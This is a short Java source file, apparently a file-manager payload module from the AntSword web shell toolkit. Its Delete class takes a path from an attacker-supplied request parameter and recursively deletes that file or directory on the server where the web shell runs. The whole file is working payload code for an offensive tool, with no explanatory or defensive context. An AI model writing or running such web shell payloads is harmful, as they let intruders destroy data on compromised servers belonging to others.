package filemanager;

import antSword.Template;

import java.io.File;

public class Delete extends Template {
    @Override
    public String run() throws Exception {

        String z1 = getParam("antswordargpath");
        return DeleteFileOrDirCode(z1);

    }

    String DeleteFileOrDirCode(String fileOrDirPath) throws Exception {
        File f = new File(fileOrDirPath);
        if (f.isDirectory()) {
            File[] x = f.listFiles();
            for (int k = 0; k < x.length; k++) {
                if (!x[k].delete()) {
                    DeleteFileOrDirCode(x[k].getPath());
                }
            }
        }
        f.delete();
        return "1";
    }
}
